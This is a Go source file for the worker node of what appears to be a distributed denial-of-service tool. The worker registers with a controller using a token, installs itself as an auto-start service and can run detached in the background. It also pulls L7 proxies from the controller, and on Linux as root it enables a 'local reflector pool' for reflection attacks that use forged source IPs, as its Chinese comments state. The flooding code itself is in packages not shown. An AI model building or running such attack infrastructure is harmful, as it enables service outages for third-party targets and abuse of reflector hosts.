package main

import (
	"context"
	"flag"
	"fmt"
	"log"
	"os"
	"os/exec"
	"os/signal"
	"strconv"
	"strings"
	"syscall"

	"newtool/internal/attack"
	"newtool/internal/worker"
)

var (
	controllerAddr = flag.String("c", "", "Controller address (host:port)")
	authToken      = flag.String("token", "", "Worker auth token")
	install        = flag.Bool("install", false, "Install as system service (auto-start)")
	useProxy       = flag.Bool("proxy", false, "Fetch and use L7 proxies from controller")
	daemon         = flag.Bool("daemon", false, "Run in background (no nohup needed, for non-root servers)")
	httpPort       = flag.String("http-port", "8080", "Controller HTTP port (dashboard/API, default 8080)")
)

func main() {
	flag.Parse()

	if *install {
		if *controllerAddr == "" || *authToken == "" {
			log.Fatal("--install requires -c and -token")
		}
		if err := worker.InstallAutoStartHTTP(*controllerAddr, *authToken, *httpPort); err != nil {
			log.Fatalf("Install failed: %v", err)
		}
		fmt.Println("Auto-start installed successfully.")
		return
	}

	if *controllerAddr == "" || *authToken == "" {
		fmt.Println("Usage: worker -c <controller_ip:port> -token <token> [flags]")
		fmt.Println()
		fmt.Println("Required:")
		fmt.Println("  -c       Controller address (e.g., 10.0.0.1:9090)")
		fmt.Println("  -token   Worker auth token from controller")
		fmt.Println()
		fmt.Println("Optional:")
		fmt.Println("  -proxy    Fetch and use L7 proxies from controller")
		fmt.Println("  -install  Install as auto-start system service")
		fmt.Println("  -daemon   Run in background (re-launches itself detached,")
		fmt.Println("            log: data/worker.log, pid: data/worker.pid)")
		fmt.Println()
		fmt.Println("Worker auto-detects location and enables local reflector pool")
		fmt.Println("Bandwidth: unlimited by default, auto-throttled when controller is disconnected")
		return
	}

	// 后台运行：父进程重新拉起自身（detached + 输出重定向到日志）后立即退出。
	// NETTOOL_DAEMONIZED 环境变量防止子进程再次自启造成无限循环。
	if *daemon && os.Getenv("NETTOOL_DAEMONIZED") == "" {
		if err := launchBackground(); err != nil {
			log.Fatalf("[daemon] failed to start in background: %v", err)
		}
		fmt.Println("Worker started in background.")
		fmt.Println("  PID: data/worker.pid   Log: data/worker.log")
		return
	}

	log.SetFlags(log.LstdFlags | log.Lshortfile)

	wanIP, err := worker.GetWANIP()
	if err != nil {
		log.Printf("[!] Failed to get WAN IP: %v, using localhost", err)
		wanIP = "127.0.0.1"
	}

	workerID := strings.ReplaceAll(wanIP, ".", "-") + "-node1"

	// 自动检测地理位置
	location, err := worker.DetectLocation()
	if err != nil {
		log.Printf("[!] Failed to detect location: %v, using US as default", err)
		location = "US"
	}

	log.Printf("Worker starting")
	log.Printf("  Proposed ID: %s", workerID)
	log.Printf("  Controller:  %s", *controllerAddr)
	log.Printf("  Location:    %s (auto-detected)", location)
	log.Printf("  OS:          %s", func() string {
		if worker.IsWindows() {
			return "Windows (no IP spoofing)"
		}
		return "Linux (IP spoofing capable)"
	}())

	// 确定代理来源
	proxySource := "none"
	if *useProxy {
		proxySource = "controller"
		log.Printf("  Proxy:       enabled (from controller)")
	}

	w := worker.New(workerID, *controllerAddr, *authToken, proxySource, 0)
	w.SetHTTPPort(*httpPort)

	// 反射器攻击必须伪造源 IP：平台级预判（Windows / 非 root / 编译平台
	// 不支持）时本地反射器池毫无意义，直接跳过创建（连 SQLite 库都不建）。
	// 真正能力仍由 spoof-probe 探测最终确认（见 worker.Run）。
	if !worker.IsWindows() && worker.IsRoot() && attack.SupportsSpoofing() {
		if err := w.EnableLocalPool(location); err != nil {
			log.Fatalf("Failed to enable local pool: %v", err)
		}
		log.Printf("  Local pool:  enabled")
	} else {
		log.Printf("  Local pool:  skipped (IP spoofing unavailable on this platform)")
	}

	if err := w.Connect(); err != nil {
		log.Fatalf("Failed to connect: %v", err)
	}

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sigChan
		log.Println("Shutting down...")
		cancel()
	}()

	if err := w.Run(ctx); err != nil && err != context.Canceled {
		log.Fatalf("Worker error: %v", err)
	}

	log.Println("Worker stopped")
}

// launchBackground 重新执行自身（保留全部参数），子进程脱离终端、输出写入
// data/worker.log，PID 写入 data/worker.pid，然后父进程退出。
// 非 root 小机器无需再手动 nohup ... &
func launchBackground() error {
	exe, err := os.Executable()
	if err != nil {
		return fmt.Errorf("get executable path: %w", err)
	}

	os.MkdirAll("data", 0755)
	logFile, err := os.OpenFile("data/worker.log", os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
	if err != nil {
		return fmt.Errorf("open log file: %w", err)
	}

	cmd := exec.Command(exe, os.Args[1:]...)
	cmd.Env = append(os.Environ(), "NETTOOL_DAEMONIZED=1")
	cmd.Stdout = logFile
	cmd.Stderr = logFile
	cmd.Stdin = nil
	detach(cmd)

	if err := cmd.Start(); err != nil {
		logFile.Close()
		return fmt.Errorf("start background process: %w", err)
	}
	pid := cmd.Process.Pid
	logFile.Close()

	if err := os.WriteFile("data/worker.pid", []byte(strconv.Itoa(pid)), 0644); err != nil {
		log.Printf("[daemon] failed to write pid file: %v", err)
	}
	log.Printf("[daemon] background process started (pid=%d, log=data/worker.log)", pid)
	return nil
}
